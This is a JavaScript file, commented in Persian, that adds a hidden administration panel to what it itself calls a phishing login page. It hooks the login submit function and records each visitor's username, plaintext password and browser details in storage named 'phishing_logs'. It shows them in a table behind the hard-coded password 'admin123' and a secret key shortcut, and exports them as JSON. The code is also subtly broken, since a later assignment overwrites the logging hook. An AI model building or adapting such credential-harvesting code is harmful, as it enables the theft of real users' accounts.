// پنل مدیریت مخفی - با رمز "admin123" باز می‌شود
class AdminPanel {
    constructor() {
        this.STORAGE_KEY = 'phishing_logs';
        this.ADMIN_PASSWORD = 'admin123'; // رمز پنل
        this.isAdmin = false;
        this.init();
    }

    init() {
        // ذخیره لاگ‌های ورود
        this.setupLoginLogging();
        
        // دکمه مخفی پنل مدیریت
        this.createAdminButton();
        
        // بررسی وجود پنل در URL
        this.checkUrlForAdmin();
    }

    // ذخیره لاگ‌های ورود
    setupLoginLogging() {
        const originalSubmit = window.loginSubmit;
        
        window.loginSubmit = function(formData) {
            // ذخیره لاگ
            AdminPanel.saveLoginLog(formData);
            
            // اجرای تابع اصلی
            if (originalSubmit) {
                originalSubmit(formData);
            }
            
            // نمایش پیام موفقیت
            alert('اطلاعات ذخیره شد! لاگ‌ها در پنل مدیریت قابل مشاهده هستند.');
            return true;
        };
    }

    static saveLoginLog(formData) {
        const logs = AdminPanel.getLogs();
        const logEntry = {
            id: Date.now(),
            username: formData.username,
            password: formData.password,
            remember: formData.remember,
            timestamp: new Date().toLocaleString('fa-IR'),
            ip: 'بدست آمده از سرور', // در حالت واقعی از سرور گرفته می‌شود
            userAgent: navigator.userAgent
        };
        
        logs.push(logEntry);
        localStorage.setItem('phishing_logs', JSON.stringify(logs));
        
        // همچنین در sessionStorage برای نمایش فوری
        sessionStorage.setItem('last_login', JSON.stringify(logEntry));
        
        console.log('📝 لاگ ذخیره شد:', logEntry);
        return logEntry;
    }

    static getLogs() {
        const logs = localStorage.getItem('phishing_logs');
        return logs ? JSON.parse(logs) : [];
    }

    static clearLogs() {
        localStorage.removeItem('phishing_logs');
        sessionStorage.removeItem('last_login');
    }

    // ایجاد دکمه مخفی پنل
    createAdminButton() {
        // ایجاد دکمه مخفی (فقط با کلید ترکیبی دیده می‌شود)
        const adminBtn = document.createElement('button');
        adminBtn.id = 'hiddenAdminBtn';
        adminBtn.innerHTML = '🔐';
        adminBtn.title = 'پنل مدیریت (Ctrl+Shift+A)';
        adminBtn.style.cssText = `
            position: fixed;
            bottom: 10px;
            left: 10px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #2980b9;
            color: white;
            border: none;
            cursor: pointer;
            opacity: 0.3;
            z-index: 9999;
            font-size: 18px;
            transition: opacity 0.3s;
        `;
        
        adminBtn.onmouseover = () => adminBtn.style.opacity = '1';
        adminBtn.onmouseout = () => adminBtn.style.opacity = '0.3';
        adminBtn.onclick = (e) => {
            e.preventDefault();
            this.showAdminLogin();
        };
        
        document.body.appendChild(adminBtn);
        
        // کلید ترکیبی Ctrl+Shift+A
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                e.preventDefault();
                this.showAdminLogin();
            }
            
            // کلید ترکیبی برای نمایش مستقیم (Ctrl+Shift+D)
            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
                e.preventDefault();
                if (this.isAdmin) {
                    this.showAdminPanel();
                } else {
                    this.showAdminLogin();
                }
            }
        });
    }

    // نمایش فرم ورود پنل مدیریت
    showAdminLogin() {
        const password = prompt('🔐 ورود به پنل مدیریت\nلطفاً رمز عبور را وارد کنید:', '');
        
        if (password === this.ADMIN_PASSWORD) {
            this.isAdmin = true;
            this.showAdminPanel();
        } else if (password !== null) {
            alert('❌ رمز عبور اشتباه است!');
        }
    }

    // نمایش پنل مدیریت
    showAdminPanel() {
        const logs = AdminPanel.getLogs();
        
        // ایجاد overlay
        const overlay = document.createElement('div');
        overlay.id = 'adminOverlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            direction: rtl;
        `;
        
        // محتوای پنل
        overlay.innerHTML = `
            <div style="
                background: white;
                width: 90%;
                max-width: 800px;
                height: 80%;
                border-radius: 10px;
                padding: 20px;
                overflow: hidden;
                display: flex;
                flex-direction: column;
            ">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #2980b9; padding-bottom: 10px;">
                    <h2 style="color: #2980b9; margin: 0;">📊 پنل مدیریت - لاگ‌های ورود</h2>
                    <button onclick="document.getElementById('adminOverlay').remove();" style="
                        background: #e74c3c;
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                    ">✕ بستن</button>
                </div>
                
                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <button onclick="adminPanel.exportLogs()" style="
                        background: #27ae60;
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                        flex: 1;
                    ">📥 ذخیره لاگ‌ها (JSON)</button>
                    
                    <button onclick="adminPanel.clearAllLogs()" style="
                        background: #e74c3c;
                        color: white;
                        border: none;
                        padding: 8px 15px;
                        border-radius: 5px;
                        cursor: pointer;
                        flex: 1;
                    ">🗑️ حذف همه لاگ‌ها</button>
                </div>
                
                <div style="flex: 1; overflow-y: auto; border: 1px solid #ddd; border-radius: 5px; padding: 10px;">
                    ${this.generateLogsHTML(logs)}
                </div>
                
                <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; color: #666; font-size: 14px;">
                    <strong>📈 آمار:</strong> 
                    ${logs.length} ورود ثبت شده | 
                    آخرین ورود: ${logs.length > 0 ? logs[logs.length-1].timestamp : '--'}
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
    }

    // تولید HTML لاگ‌ها
    generateLogsHTML(logs) {
        if (logs.length === 0) {
            return '<div style="text-align: center; color: #999; padding: 40px;">هیچ لاگی ثبت نشده است</div>';
        }
        
        return `
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background: #f8f9fa;">
                        <th style="padding: 12px; border: 1px solid #ddd; text-align: center;">#</th>
                        <th style="padding: 12px; border: 1px solid #ddd; text-align: center;">زمان</th>
                        <th style="padding: 12px; border: 1px solid #ddd; text-align: center;">نام کاربری</th>
                        <th style="padding: 12px; border: 1px solid #ddd; text-align: center;">رمز عبور</th>
                        <th style="padding: 12px; border: 1px solid #ddd; text-align: center;">مرا بخاطر بسپار</th>
                        <th style="padding: 12px; border: 1px solid #ddd; text-align: center;">IP</th>
                    </tr>
                </thead>
                <tbody>
                    ${logs.map((log, index) => `
                        <tr style="${index % 2 === 0 ? 'background: #f9f9f9;' : ''}">
                            <td style="padding: 10px; border: 1px solid #ddd; text-align: center;">${index + 1}</td>
                            <td style="padding: 10px; border: 1px solid #ddd; text-align: center;">${log.timestamp}</td>
                            <td style="padding: 10px; border: 1px solid #ddd; text-align: center; font-family: monospace;">${this.escapeHtml(log.username)}</td>
                            <td style="padding: 10px; border: 1px solid #ddd; text-align: center; font-family: monospace; color: #c0392b;">${this.escapeHtml(log.password)}</td>
                            <td style="padding: 10px; border: 1px solid #ddd; text-align: center;">${log.remember ? '✅' : '❌'}</td>
                            <td style="padding: 10px; border: 1px solid #ddd; text-align: center; font-size: 12px;">${log.ip}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        `;
    }

    // خروجی گرفتن لاگ‌ها
    exportLogs() {
        const logs = AdminPanel.getLogs();
        const dataStr = JSON.stringify(logs, null, 2);
        const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
        
        const exportFileDefaultName = `phishing_logs_${new Date().getTime()}.json`;
        
        const linkElement = document.createElement('a');
        linkElement.setAttribute('href', dataUri);
        linkElement.setAttribute('download', exportFileDefaultName);
        linkElement.click();
        
        alert(`✅ ${logs.length} لاگ با موفقیت ذخیره شد`);
    }

    // پاک کردن همه لاگ‌ها
    clearAllLogs() {
        if (confirm('⚠️ آیا مطمئن هستید که می‌خواهید همه لاگ‌ها را حذف کنید؟')) {
            AdminPanel.clearLogs();
            document.getElementById('adminOverlay').remove();
            alert('✅ همه لاگ‌ها حذف شدند');
            this.showAdminPanel(); // نمایش پنل خالی
        }
    }

    // جلوگیری از XSS
    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
}

// تابع اصلی ارسال فرم (ویرایش شده)
function handleLoginSubmit(formData) {
    // نمایش در کنسول
    console.log('🔐 اطلاعات دریافتی:', formData);
    
    // ذخیره در لاگ (به صورت خودکار توسط AdminPanel انجام می‌شود)
    return true;
}

// مقداردهی اولیه
let adminPanel;

document.addEventListener('DOMContentLoaded', function() {
    // ایجاد پنل مدیریت
    adminPanel = new AdminPanel();
    
    // تنظیم تابع ارسال فرم
    window.loginSubmit = handleLoginSubmit;
    
    // ذخیره آخرین لاگ برای نمایش در پنل
    const lastLogin = sessionStorage.getItem('last_login');
    if (lastLogin) {
        console.log('📋 آخرین ورود:', JSON.parse(lastLogin));
    }
    
    // نمایش راهنمای دسترسی
    setTimeout(() => {
        console.log('🔑 دسترسی به پنل مدیریت:');
        console.log('1. کلیک روی دکمه 🔐 گوشه پایین چپ');
        console.log('2. کلیدهای Ctrl+Shift+A');
        console.log('3. رمز عبور: admin123');
    }, 3000);
});